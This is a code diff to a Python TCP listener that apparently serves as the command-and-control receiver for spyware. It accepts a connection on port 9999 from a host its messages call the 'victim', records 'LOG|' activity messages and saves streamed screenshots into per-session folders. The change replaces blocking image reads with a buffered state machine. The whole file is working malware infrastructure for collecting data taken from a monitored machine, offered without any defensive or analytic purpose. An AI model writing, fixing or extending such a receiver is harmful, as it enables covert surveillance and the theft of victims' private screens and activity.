@@ -3,7 +3,6 @@ import socket
 import os
 import sys
 import datetime
-import threading
 
 def generate_session_folder():
     """Creates a timestamped folder for this session."""
@@ -18,10 +17,10 @@ def main():
     session_folder = generate_session_folder()
     print(f"[+] Session folder created: {session_folder}")
 
-    # Open log file inside session folder
+    # Open the unified log file
     log_file_path = os.path.join(session_folder, "full_activity.log")
     log_file = open(log_file_path, "a", encoding="utf-8")
-    
+
     def log_and_print(message):
         """Print to console and write to log file."""
         print(message)
@@ -31,7 +30,7 @@ def main():
     # Setup server
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    
+
     try:
         s.bind(("0.0.0.0", 9999))
         s.listen(1)
@@ -44,11 +43,19 @@ def main():
     try:
         conn, addr = s.accept()
         log_and_print(f"[+] Connected by {addr}")
-        
+
         # Set timeout to avoid hanging
         conn.settimeout(5.0)
 
+        # Buffer to accumulate data
         buffer = b""
+
+        # State variables for handling binary data
+        in_image_reception = False
+        image_data = b""
+        image_remaining = 0
+        image_filename = ""
+
         while True:
             try:
                 # Receive data in chunks
@@ -57,54 +64,77 @@ def main():
                     log_and_print("[-] Connection closed by victim.")
                     break
 
+                # Append received chunk to buffer
                 buffer += chunk
 
-                # Process all complete lines in buffer
-                while b"\n" in buffer:
+                # Main loop: Process text lines unless we're in the middle of receiving an image
+                while not in_image_reception and b"\n" in buffer:
+                    # Split on the first newline
                     line, _, buffer = buffer.partition(b"\n")
+                    # Decode the line as UTF-8, ignoring errors
                     line = line.strip().decode("utf-8", errors="ignore")
 
                     if line.startswith("LOG|"):
+                        # Extract the log message and write it to the log
                         message = line[4:]
                         log_and_print(f"[📝 LOG] {message}")
 
                     elif line.startswith("IMAGE|"):
+                        # Parse the image header
                         try:
-                            _, filename, size_str = line.split("|", 2)
+                            parts = line.split("|", 2)
+                            _, filename, size_str = parts
                             size = int(size_str)
+                            image_filename = filename
                             log_and_print(f"[📸] Receiving image: {filename} ({size} bytes)")
-                            
-                            # Receive exactly 'size' bytes
+                            # Switch to binary reception mode
+                            in_image_reception = True
+                            image_remaining = size
                             image_data = b""
-                            remaining = size
-                            while remaining > 0:
-                                chunk = conn.recv(min(4096, remaining))
-                                if not chunk:
-                                    raise ConnectionError("Connection closed during transfer")
-                                image_data += chunk
-                                remaining -= len(chunk)
-                                print(f"[📸] Received {len(image_data)}/{size} bytes")
-                            
-                            # Save image
-                            image_path = os.path.join(session_folder, "screenshots", filename)
-                            with open(image_path, "wb") as f:
-                                f.write(image_data)
-                            log_and_print(f"[✅] Image saved: {image_path}")
-                            
                         except Exception as e:
-                            log_and_print(f"[❌] Error receiving image: {e}")
+                            log_and_print(f"[❌] Failed to parse image header: {e}")
 
                     else:
-                        log_and_print(f"[📡 UNKNOWN] {line}")
+                        # Log any other unknown text lines
+                        log_and_print(f"[📡] {line}")
+
+                # If we are in the middle of receiving an image
+                if in_image_reception:
+                    # Check if we have enough data in the buffer
+                    if len(buffer) >= image_remaining:
+                        # Take the exact number of bytes needed for the image
+                        image_data += buffer[:image_remaining]
+                        # Keep the rest of the buffer for the next iteration
+                        buffer = buffer[image_remaining:]
+
+                        # Save the received image
+                        image_path = os.path.join(session_folder, "screenshots", image_filename)
+                        with open(image_path, "wb") as f:
+                            f.write(image_data)
+                        log_and_print(f"[✅] Image saved: {image_path}")
+
+                        # Reset the image reception state
+                        in_image_reception = False
+                        image_remaining = 0
+                        image_data = b""
+                        image_filename = ""
+                    else:
+                        # Add the entire buffer to the image data
+                        image_data += buffer
+                        # Subtract the number of bytes we just consumed
+                        image_remaining -= len(buffer)
+                        # Clear the buffer
+                        buffer = b""
 
             except socket.timeout:
-                # Check if connection is still alive
+                # Check if the connection is still alive
                 try:
-                    conn.send(b"")  # This will fail if connection is dead
+                    conn.send(b"")  
                 except:
-                    log_and_print("[-] Connection timed out or lost.")
+                    log_and_print("[-] Connection lost.")
                     break
-                continue  # No data, but connection alive
+                # No data received, continue loop
+                continue
 
             except ConnectionResetError:
                 log_and_print("[-] Connection reset by victim.")
